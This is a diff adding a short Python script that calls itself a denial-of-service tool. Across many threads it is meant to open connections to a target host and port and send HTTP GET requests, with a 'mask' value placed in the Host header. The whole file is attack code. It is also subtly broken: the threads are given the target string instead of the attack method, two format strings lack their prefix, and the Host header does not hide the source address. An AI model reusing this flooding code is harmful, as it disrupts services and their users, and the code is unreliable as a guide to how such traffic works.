@@ -1,0 +1,24 @@
+#!/usr/bin/env python3
+import socket
+import threading
+class DenialOfService(object):
+    def __init__(self, target="192.168.0.0", port=80, ip_mask="192.21.20.32"):
+        self.target=target
+        self.port = port
+        self.ip_mask = ip_mask
+
+    def run(self, n = 10000):
+        for i in range(n):
+            thread = threading.Thread(target=self.target).start()
+    
+    def attack(self):
+        while True:
+            print("Pinging {self.target}...")
+            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            connection.connect((self.target, self.port))
+            connection.sendto(("GET /{self.target} HTTP/1.1\r\n").encode("ascii"), (self.target, self.port))
+            connection.sendto((f"Host: {self.ip_mask}\r\n\r\n").encode("ascii"), (self.target, self.port))
+            connection.close()
+
+if __name__ == "__main__":
+    DenialOfService().run()
